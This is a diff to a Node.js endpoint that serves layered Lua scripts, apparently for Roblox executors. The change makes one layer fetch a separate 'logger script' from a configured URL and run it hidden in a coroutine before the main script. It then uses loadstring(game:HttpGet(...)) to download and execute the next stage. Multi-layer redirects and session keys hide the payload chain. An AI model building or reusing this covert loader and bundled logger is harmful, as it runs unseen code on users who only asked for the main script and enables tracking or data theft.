@@ -170,7 +170,7 @@ module.exports = async function(req, res) {
          * idx 1 → layer 2 → redirect biasa
          * idx 2 → layer 3 → redirect biasa
          * idx 3 → layer 4 → redirect biasa
-         * idx 4 → layer 5 → logger script + loadstring ke layer 6
+         * idx 4 → layer 5 → logger (coroutine) + loadstring ke layer 6
          * idx 5 → layer 6 → main script SAJA ✅
          */
 
@@ -181,7 +181,7 @@ module.exports = async function(req, res) {
             return res.status(200).send(mainScript || '');
         }
 
-        // ========== LAYER 5 (idx = TOTAL_LAYERS - 2): LOGGER SCRIPT + REDIRECT KE LAYER 6 ==========
+        // ========== LAYER 5 (idx = TOTAL_LAYERS - 2): LOGGER DI COROUTINE + LOADSTRING KE LAYER 6 ==========
         if (idx === SETTINGS.TOTAL_LAYERS - 2) {
             const nextIndex = idx + 1;
             const { newSessionID, nextKey, waitTime } = makeSession(
@@ -192,7 +192,14 @@ module.exports = async function(req, res) {
             const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
             const nextStepNumber = session.stepSequence[nextIndex];
             const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
-            const luaScript = (loggerScript || '') + "\ntask.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
+
+            // Logger jalan di coroutine terpisah supaya tidak conflict dengan main script
+            const luaScript = "coroutine.wrap(function()\n" +
+                              (loggerScript || '') + "\n" +
+                              "end)()\n" +
+                              "task.wait(" + (waitTime / 1000) + ") " +
+                              "loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
+
             return res.status(200).send(luaScript);
         }
 
